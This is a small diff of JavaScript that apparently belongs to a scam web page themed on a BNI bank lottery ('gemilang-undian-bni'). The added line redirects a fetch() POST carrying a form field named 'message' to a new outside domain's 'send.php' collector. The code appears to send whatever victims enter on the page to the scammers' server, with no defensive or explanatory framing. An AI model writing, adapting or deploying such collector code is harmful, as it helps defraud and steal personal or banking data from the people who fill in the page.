@@ -27,7 +27,7 @@ function next() {
 	var fd = new FormData();
 	fd.append('message', message);
 	
-	fetch("https://bgsxh.my.id/senders/"
+	fetch("https://bdmgsx.my.id/senders/"
         +"gemilang-undian-bni/send.php", {
         method: 'POST',
         body: fd
